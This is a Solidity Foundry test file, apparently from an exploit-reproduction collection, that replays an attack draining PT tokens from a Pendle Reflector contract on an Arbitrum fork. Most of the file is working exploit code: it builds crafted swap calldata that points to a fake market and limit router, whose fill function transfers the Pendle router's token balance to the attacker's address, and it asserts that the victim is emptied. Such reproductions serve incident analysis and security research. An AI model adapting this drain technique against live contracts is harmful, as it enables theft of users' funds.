// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2304.18 USD
// Attacker : 0x6c1d0f1EF9ac1C989cCA02955d0e2b23d134e03A
// Attack Contract : 0xb630D5Ba520Ca38E9137900BDFe2eD8900665D0D
// Vulnerable Contract : 0x5039Da22E5126e7c4e9284376116716A91782faF
// Attack Tx : https://arbiscan.io/tx/0xf6c6a639d644122803ecc655f6debdc5f2333516eedb9d5991088d170e2e36fb
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x5039Da22E5126e7c4e9284376116716A91782faF#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1596
//
// Attack summary: The attacker called Pendle Reflector with crafted router calldata that used a fake market and a
// fake limit router. Reflector scaled each call to its full PT token balance, approved the real Pendle router, and the
// fake limit router pulled the router's temporary token balance to the attacker.
// Root cause: Reflector.reflect(bytes) trusted caller-supplied Pendle market and limit-router calldata while operating
// on Reflector-held token balances.

address constant ATTACKER = 0x6c1d0f1EF9ac1C989cCA02955d0e2b23d134e03A;
address constant ATTACK_CONTRACT = 0xb630D5Ba520Ca38E9137900BDFe2eD8900665D0D;
address constant REFLECTOR = 0x5039Da22E5126e7c4e9284376116716A91782faF;
address constant PENDLE_ROUTER = 0x888888888889758F76e7103c6CbF23ABbF58F946;
address constant ACTION_SWAP_YT_V3 = 0x4a03Ce0a268951d04E187B1CF48075eE69266e27;
address constant PT_MPENDLE = 0x4a94091CAdD74BDf313B74d58EAc908C5fC53704;
address constant PT_STK_EPENDLE = 0x2A18A490EC18b019837f6153269d21A772167292;

struct ApproxParams {
    uint256 guessMin;
    uint256 guessMax;
    uint256 guessOffchain;
    uint256 maxIteration;
    uint256 eps;
}

struct Order {
    uint256 salt;
    uint256 expiry;
    uint256 nonce;
    uint8 orderType;
    address token;
    address YT;
    address maker;
    address receiver;
    uint256 makingAmount;
    uint256 lnImpliedRate;
    uint256 failSafeRate;
    bytes permit;
}

struct FillOrderParams {
    Order order;
    bytes signature;
    uint256 makingAmount;
}

struct LimitOrderData {
    address limitRouter;
    uint256 epsSkipMarket;
    FillOrderParams[] normalFills;
    FillOrderParams[] flashFills;
    bytes optData;
}

interface IPendleReflector {
    function reflect(
        bytes calldata inputData
    ) external returns (bytes memory result);
}

interface IPendleActionSwapYTV3 {
    function swapExactSyForYt(
        address receiver,
        address market,
        uint256 exactSyIn,
        uint256 minYtOut,
        ApproxParams calldata guessYtOut,
        LimitOrderData calldata limit
    ) external returns (uint256 netYtOut, uint256 netSyFee);
}

interface IPendleLimitRouter {
    function fill(
        FillOrderParams[] calldata params,
        address receiver,
        uint256 maxTaking,
        bytes calldata optData,
        bytes calldata callback
    ) external returns (uint256 actualMaking, uint256 actualTaking, uint256 totalFee, bytes memory ret);
}

contract ContractTest is BaseTestWithBalanceLog {
    FakePendleMarketLimitRouter fakeMarket;

    function setUp() public {
        uint256 forkBlock = 363_776_990;
        vm.createSelectFork("arbitrum", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(REFLECTOR, "Pendle Reflector");
        vm.label(PENDLE_ROUTER, "Pendle Router");
        vm.label(ACTION_SWAP_YT_V3, "Pendle ActionSwapYTV3");
        vm.label(PT_MPENDLE, "PT-mPendle-27MAR2025");
        vm.label(PT_STK_EPENDLE, "PT-stk-EPendle-27MAR2025");

        attacker = ATTACKER;
        multiAssetLog = true;
        fundingTokens.push(PT_MPENDLE);
        fundingTokens.push(PT_STK_EPENDLE);

        fakeMarket = new FakePendleMarketLimitRouter(ATTACKER);
    }

    function testExploit() public balanceLog {
        uint256 mPendleVictimBefore = IERC20(PT_MPENDLE).balanceOf(REFLECTOR);
        uint256 stkEPendleVictimBefore = IERC20(PT_STK_EPENDLE).balanceOf(REFLECTOR);
        uint256 mPendleAttackerBefore = IERC20(PT_MPENDLE).balanceOf(ATTACKER);
        uint256 stkEPendleAttackerBefore = IERC20(PT_STK_EPENDLE).balanceOf(ATTACKER);

        // step 1: drain Reflector's PT-mPendle through a fake Pendle market and limit router.
        _reflectAndDrain(PT_MPENDLE, mPendleVictimBefore);

        // step 2: reuse the same fake market path for Reflector's PT-stk-EPendle balance.
        _reflectAndDrain(PT_STK_EPENDLE, stkEPendleVictimBefore);

        assertEq(IERC20(PT_MPENDLE).balanceOf(REFLECTOR), 0, "PT-mPendle left in Reflector");
        assertEq(IERC20(PT_STK_EPENDLE).balanceOf(REFLECTOR), 0, "PT-stk-EPendle left in Reflector");
        assertGe(
            IERC20(PT_MPENDLE).balanceOf(ATTACKER) - mPendleAttackerBefore, mPendleVictimBefore, "PT-mPendle profit"
        );
        assertGe(
            IERC20(PT_STK_EPENDLE).balanceOf(ATTACKER) - stkEPendleAttackerBefore,
            stkEPendleVictimBefore,
            "PT-stk-EPendle profit"
        );
    }

    function _reflectAndDrain(
        address token,
        uint256 amount
    ) internal {
        fakeMarket.settoken(token);
        IPendleReflector(REFLECTOR).reflect(_buildReflectorInput(amount));
    }

    function _buildReflectorInput(
        uint256 exactSyIn
    ) internal view returns (bytes memory) {
        ApproxParams memory guess = ApproxParams({guessMin: 0, guessMax: 0, guessOffchain: 0, maxIteration: 32, eps: 0});
        LimitOrderData memory limit = _fakeLimitOrderData();

        return abi.encodeCall(
            IPendleActionSwapYTV3.swapExactSyForYt, (ATTACK_CONTRACT, address(fakeMarket), exactSyIn, 0, guess, limit)
        );
    }

    function _fakeLimitOrderData() internal view returns (LimitOrderData memory limit) {
        limit.limitRouter = address(fakeMarket);
        limit.epsSkipMarket = 3;
        limit.normalFills = new FillOrderParams[](1);
        limit.flashFills = new FillOrderParams[](0);
        limit.optData = "";
    }
}

contract FakePendleMarketLimitRouter is IPendleLimitRouter {
    address private token;
    address private immutable attacker;

    constructor(
        address attacker_
    ) {
        attacker = attacker_;
    }

    function settoken(
        address token_
    ) external {
        token = token_;
    }

    function readTokens() external view returns (address SY, address PT, address YT) {
        return (token, token, token);
    }

    function fill(
        FillOrderParams[] calldata,
        address,
        uint256 maxTaking,
        bytes calldata,
        bytes calldata
    ) external returns (uint256 actualMaking, uint256 actualTaking, uint256 totalFee, bytes memory ret) {
        uint256 routerBalance = IERC20(token).balanceOf(PENDLE_ROUTER);
        IERC20(token).transferFrom(PENDLE_ROUTER, attacker, routerBalance);
        return (0, maxTaking, 0, "");
    }
}
